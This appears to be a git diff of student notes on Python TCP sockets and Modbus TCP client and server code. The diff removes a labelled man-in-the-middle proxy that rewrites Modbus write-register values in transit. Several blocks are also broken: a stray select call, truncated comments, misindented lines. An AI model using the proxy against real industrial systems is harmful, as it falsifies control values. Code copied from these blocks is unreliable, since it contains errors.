@@ -57,18 +57,14 @@ This says the connection will be listent from local host(the computer) and 12345
 # TCP SERVER
 ```
 import socket
-
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-server_address = ('localhost', 12345)
-sock.bind(server_address)
-sock.listen(1)
+server_address = ('localhost', 12345) #port is in between 1 to 65535 
+sock.bind(server_address) #bind expects a tuple the values depend on the type o>
+sock.listen()
 
 print('Server started. Waiting for a connection...')
-connection, client_address = sock.accept()
-
-try:
+connection, client_address = sock.accept() #complete connection in server side
+with connection:
     print('Connection from:', client_address)
     while True:
         data = connection.recv(1600)
@@ -80,216 +76,179 @@ try:
             connection.sendall(response.encode('utf-8'))
         else:
             break
-finally:
-    connection.close()
-    sock.close()
+print('Closing server')
+sock.close()
 ```
 # TCP CLIENT
 ```
 import socket
-
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_address = ('localhost', 12345)
+client_address = ('localhost', 12345) #port is in between 1 to 65535 
 
-print('Connecting to %s port %s' % server_address)
-sock.connect(server_address)
+print('Client started. Waiting for a connection...')
+sock.connect(client_address) #complete connection in server side
+message = "Hello World"
+print('Sending: "%s"' % message)
+sock.sendall(message.encode('utf-8'))
 
-try:
-    message = "Hello World"
-    print('Sending: "%s"' % message)
-    sock.sendall(message.encode('utf-8'))
+data = sock.recv(1600)
+print('Received from server: "%s"' % data.decode('utf-8'))
 
-    data = sock.recv(1600)
-    print('Received from server: "%s"' % data.decode('utf-8'))
-finally:
-    print('Closing client')
-    sock.close()
+print('Closing client')
+sock.close()
+
+
+# This line pauses the code until something happens on ANY socket in 'inputs'
+readable, writable, exceptional = select.select(inputs, [], [])
 ```
-# TCP SERVER MULTIPLE
+# MULTIPLE CLIENT MODEL:
+
+There are three methods: either threads, or use asynchronous input output, other is .select()
+Which helps in finding multiple input output completion of more than one socket at the same time. 
+Three sets of select()
+Read set: check for incoming data
+Write set: check if ready to receive data
+Exception set: for error
+# MULTIPLE TCPSERVER:
 ```
 import socket
-from _thread import start_new_thread
 import threading
 
-lock = threading.Lock()
+IP=socket.gethostbyname(socket.gethostname())
+PORT=1107
+ADDRESS=(IP,PORT)
 
-def handle_client(c):
+
+
+def handle_client(conn,addr):
+    print(f"New connection made:{addr}")
+    
     while True:
-        data = c.recv(1024)
-        if not data:
-            print('Bye')
-            lock.release()
+        msg=conn.recv(1600).decode("utf-8")
+        if msg=="Disconnect":
             break
-        c.send(data[::-1])
-    c.close()
+        print(f"{addr}: {msg}")
+        msg=msg+"Message recieved"
+        conn.send(msg.encode("utf-8"))
+    conn.close()
 
 def main():
-    host = ''
-    port = 12345
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((host, port))
-    s.listen(5)
-    print("Server running on port", port)
-
+    server=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(ADDRESS) #takes ip address and port in a tuple
+    server.listen()
+    
     while True:
-        c, addr = s.accept()
-        lock.acquire()
-        print('Connected to:', addr[0], ':', addr[1])
-        start_new_thread(handle_client, (c,))
+        conn,addr=server.accept()
+        thread = threading.Thread(target=handle_client,args=(conn,addr)) # For >
+        thread.start()
+        print(f"Active connection: {threading.activeCount()-1}") # we do minus >
 
-if __name__ == '__main__':
+
+if __name__=="__main__":
     main()
 ```
 
-
-
-    
 # TCP CLIENT MULTIPLE
 ```
 import socket
+IP=socket.gethostbyname(socket.gethostname())
 
-def main():
-    host = '127.0.0.1'
-    port = 12345
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_address = (IP, 1107) #port is in between 1 to 65535 
+print('Client started. Waiting for a connection...') 
+sock.connect(client_address) #complete connection in server side
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
 
-    msg = "hello from client"
-    while True:
-        s.send(msg.encode('ascii'))
-        data = s.recv(1024)
-        print('Received from server:', data.decode('ascii'))
+while True:
+        print("Type Disconnect if you wanna end the connection...")
+        message = input("Write your message: ")
+        sock.send(message.encode('utf-8'))
+        if message == "Disconnect":
+                break
+        print(f"Sending: {message}")
+        data = sock.recv(1600)
+        print('Received from server: "%s"' % data.decode('utf-8'))
 
-        ans = input('Do you want to continue (y/n): ')
-        if ans.lower() != 'y':
-            break
+print('Closing client')
+sock.close()
 
-    s.close()
-
-if __name__ == '__main__':
-    main()
 ```
 
 # TCP MODBUS SERVER
 ```
-#!/bin/python
-from pyModbusTCP.server import ModbusServer
-from time import sleep
-from random import uniform
+import socket
+from pymodbus.server import StartTcpServer
+from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext
+from pymodbus.datastore import ModbusSequentialDataBlock  
 
+IP=socket.gethostbyname(socket.gethostname())
+PORT=1107
+ADDRESS=(IP,PORT)
+
+store=ModbusSlaveContext(zero_mode=True)
+context=ModbusServerContext(slave=store,single=True)
+
+print(f"New connection is made in {IP}:{PORT}")
+
+StartTcpServer(context,ADDRESS)
+```
+# Modbus server
+```
+#databank method is only for the server modserv.py
+#!/bin/python
+
+from pyModbusTCP.server import ModbusServer, DataBank
+from time import sleep
 # Create an instance of ModbusServer
-server = ModbusServer("127.0.0.1", 12345, no_block=True)
+server = ModbusServer("127.0.0.1", 1109, no_block=True)
+# the no_block is for the server.start() statement
 
 try:
     print("Start server...")
-    server.start()
+    server.start() #the script stops here to listen to w connections if set_block=False
     print("Server is online")
-    
-    # Initialize state with a list containing 0 (Modbus words are always lists)
-    state = [0]
-    
+    state = [0] # initial value of the register is 0, later when value is changed, this value is updated
+# state is a list since the get_words() return as list
     while True:
-        # NEW WAY: Use server.data_bank instead of the global DataBank class
-        # Writing a random value to Holding Register 0
-        server.data_bank.set_holding_registers(0, [int(uniform(0, 100))])
+        if state != DataBank.get_words(1):
+            state = DataBank.get_words(1)
+            print(f"New Value Received: {state[0]}")
+        sleep(0.5) #required to stop the system from overheating
 
-        # Reading Holding Register 1
-        current_reg1 = server.data_bank.get_holding_registers(1)
-
-        # Check if current_reg1 exists and has changed
-        if current_reg1 is not None and state != current_reg1:
-            state = current_reg1
-            print(f"Value of Register 1 has changed to {state}")
-
-        sleep(0.5)
-
-except KeyboardInterrupt:
-    print("\nShutdown server ...")
+except:
+    print("Shutdown server ...")
     server.stop()
     print("Server is offline")
+# single register: set_words(0,[55]) 
+# multiple register: set_words(10,[1,2,3]) writes on next next register, that is on 10 and 11
+# clear registers: set_words(0,[0]*10)
+# register numbers start from 0 to 100
+# the input integer that we can write is 16 bit value i.e 65,535 in hex 0xffff
+# try expect is to close the connection smoothly, except block is triggered with keyboard interrupt
 ```
-```
-import socket
-import threading
-# Configuration
-LOCAL_PORT = 9999        # The port the Client connects to
-TARGET_IP = "127.0.0.1"  # The real Server IP
-TARGET_PORT = 12345      # The real Server Port
-
-def handle_client(client_socket):
-    # Connect to the real Modbus Server
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.connect((TARGET_IP, TARGET_PORT))
-
-    # Thread to move data from Server back to Client
-    def server_to_client():
-        while True:
-            data = server_socket.recv(4096)
-            if not data: break
-    threading.Thread(target=server_to_client, daemon=True).start()
-
-    # Main loop to move data from Client to Server
-    while True:
-        data = client_socket.recv(4096)
-        if not data: break
-
-        modified_data = bytearray(data)
-
-        # Check for Function Code 06 (Write Single Register)
-        if len(modified_data) == 12 and modified_data[7] == 0x06:
-            # Force the value to 255 (0x00ff)
-            modified_data[10:12] = b'\x00\xff' 
-            print(f"[*] ATTACK: Modified FC06 value to 255")
-
-        print(f"[*] Intercepted Client Data: {data.hex()}")
-
-        # CRITICAL CHANGE: Send the MODIFIED data, not the original data
-        server_socket.send(modified_data)
-        # MITM Modification Example:
-        # If we see a specific pattern, we could replace it here.
-        server_socket.send(data)
-   client_socket.close()
-    server_socket.close()
-
-def start_proxy():
-    proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    proxy.bind(("0.0.0.0", LOCAL_PORT))
-    proxy.listen(5)
-    print(f"[*] MITM Proxy listening on port {LOCAL_PORT}...")
-
-    while True:
-        client_sock, addr = proxy.accept()
-        print(f"[*] Connection from {addr}")
-        threading.Thread(target=handle_client, args=(client_sock,)).start()
-
-if __name__ == "__main__":
-    start_proxy()
-
-
-
-
 
 # TCP MODBUS CLIENT
-```                           
+```
 from pyModbusTCP.client import ModbusClient
-client= ModbusClient(host="127.0.0.1",port=12345,unit_id=1, auto_open=True)
+client= ModbusClient(host="127.0.0.1",port=1109,unit_id=1, auto_open=True)
 regs = client.read_holding_registers(0, 2)
 regs1 = client.read_holding_registers(10,2)
-if regs:
 
+if regs:
     print(regs)
 else:
     print("read error")
-
 if client.write_multiple_registers(10, [44,55]):
     print("write ok")
 else:
     print("write error")
-
 if regs1:
         print(regs1)
 else:
         print("read error")
 ```
+
+
+
+
 UDP: https://dl.acm.org/doi/pdf/10.1145/1409908.1409911
